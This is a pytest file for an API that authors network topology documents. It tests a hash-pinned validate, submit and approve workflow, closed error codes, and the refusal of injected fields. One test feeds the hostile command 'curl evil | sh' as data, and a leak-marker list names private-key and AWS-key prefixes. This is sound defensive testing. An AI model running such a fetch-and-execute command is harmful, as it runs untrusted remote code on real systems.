"""HTTP surface for durable topology authoring (SECP-B9) — drives the real ASGI app.

Proves the closed-code contract end to end: only closed error codes surface (no
backend message, no rejected input, no topology content); secret injection is
refused; the create→revise→validate→submit→approve workflow is hash-pinned and
stale operations fail closed; and no response contains executable/secret-shaped
material or a plan-generation/deployment side effect.
"""

from __future__ import annotations

import pytest
from fastapi.testclient import TestClient

SCHEMA = "secp.topology/v1"

# Substrings that must never appear in any response. NOTE: the closed code
# ``topology_secret_field_forbidden`` legitimately contains "secret", so we
# scan for backend internals and injected secret VALUES, not those words.
_FORBIDDEN = (
    "Traceback",
    "sqlalchemy",
    "BEGIN OPENSSH",
    "AKIA",
    "hunter2",  # the injected secret value in the security test
)


def _doc():
    return {
        "schema_version": SCHEMA,
        "nodes": [
            {"id": "atk", "kind": "attacker", "label": "attacker", "x": 40, "y": 40},
            {"id": "web", "kind": "target", "label": "web", "x": 260, "y": 40},
            {"id": "net", "kind": "network", "label": "team-net", "x": 160, "y": 260},
        ],
        "edges": [
            {"id": "e-atk", "source": "atk", "target": "net", "kind": "network"},
            {"id": "e-web", "source": "web", "target": "net", "kind": "network"},
        ],
        "networks": [{"id": "net", "label": "team-net", "cidr": "10.20.0.0/24"}],
        "zones": [],
    }


@pytest.fixture
def client(engine):
    from secp_api.db import session_scope
    from secp_api.main import create_app
    from secp_api.seed import bootstrap_dev

    with session_scope() as s:
        bootstrap_dev(s)
    app = create_app()
    app.router.on_startup.clear()
    return TestClient(app)


def _no_forbidden(response) -> None:
    body = response.text
    for token in _FORBIDDEN:
        assert token not in body, f"response leaked `{token}`"


def _create(client, **body):
    r = client.post("/api/v1/topology-authoring/documents", json={"display_name": "D", **body})
    return r


class TestWorkflowHTTP:
    def test_full_workflow_is_hash_pinned(self, client):
        r = _create(client, document=_doc())
        assert r.status_code == 201, r.text
        _no_forbidden(r)
        detail = r.json()
        doc_id = detail["id"]
        rev = detail["current_revision"]
        assert rev["status"] == "draft"
        chash = rev["content_hash"]
        rid = rev["id"]

        # validate
        v = client.post(
            f"/api/v1/topology-authoring/documents/{doc_id}/revisions/{rid}/validate",
            json={"content_hash": chash},
        )
        assert v.status_code == 200, v.text
        assert v.json()["status"] == "valid"

        # submit
        s = client.post(
            f"/api/v1/topology-authoring/documents/{doc_id}/revisions/{rid}/submit",
            json={"content_hash": chash},
        )
        assert s.status_code == 200, s.text
        assert s.json()["status"] == "submitted"

        # approve — records a decision; response exposes NO plan/deployment field
        a = client.post(
            f"/api/v1/topology-authoring/documents/{doc_id}/revisions/{rid}/approve",
            json={"content_hash": chash, "reason": "ok"},
        )
        assert a.status_code == 200, a.text
        approved = a.json()
        assert approved["status"] == "approved"
        for forbidden_key in ("plan_id", "deployment_id", "generated_plan", "applied"):
            assert forbidden_key not in approved

    def test_submit_before_validate_is_closed_409(self, client):
        detail = _create(client, document=_doc()).json()
        doc_id, rev = detail["id"], detail["current_revision"]
        r = client.post(
            f"/api/v1/topology-authoring/documents/{doc_id}/revisions/{rev['id']}/submit",
            json={"content_hash": rev["content_hash"]},
        )
        assert r.status_code == 409
        assert r.json() == {"error": {"code": "topology_validation_required"}}

    def test_stale_hash_revision_is_closed(self, client):
        detail = _create(client, document=_doc()).json()
        doc_id = detail["id"]
        r = client.post(
            f"/api/v1/topology-authoring/documents/{doc_id}/revisions",
            json={
                "base_revision_number": 1,
                "base_content_hash": "sha256:deadbeef",
                "document": _doc(),
            },
        )
        assert r.status_code == 409
        assert r.json() == {"error": {"code": "topology_hash_mismatch"}}
        _no_forbidden(r)


class TestSecurityHTTP:
    def test_secret_injection_is_refused_with_closed_code(self, client):
        doc = _doc()
        doc["nodes"][0]["password"] = "hunter2"  # unknown + secret-shaped
        r = _create(client, document=doc)
        assert r.status_code == 422
        assert r.json() == {"error": {"code": "topology_secret_field_forbidden"}}
        _no_forbidden(r)

    def test_unknown_kind_is_refused(self, client):
        doc = _doc()
        doc["nodes"][0]["kind"] = "rootkit"
        r = _create(client, document=doc)
        assert r.status_code == 422
        assert r.json() == {"error": {"code": "topology_unknown_object_kind"}}

    def test_unknown_field_is_refused(self, client):
        doc = _doc()
        doc["nodes"][0]["command"] = "curl evil | sh"
        r = _create(client, document=doc)
        assert r.status_code == 422
        assert r.json()["error"]["code"] == "topology_schema_invalid"
        _no_forbidden(r)

    def test_not_found_is_closed_404(self, client):
        import uuid

        r = client.get(f"/api/v1/topology-authoring/documents/{uuid.uuid4()}")
        assert r.status_code == 404
        assert r.json() == {"error": {"code": "topology_not_found"}}

    def test_detail_response_has_no_secret_material(self, client):
        detail = _create(client, document=_doc()).json()
        r = client.get(f"/api/v1/topology-authoring/documents/{detail['id']}")
        assert r.status_code == 200
        _no_forbidden(r)
        # the document content is present (secret-free by construction)
        assert r.json()["current_revision"]["document_content"]["schema_version"] == SCHEMA
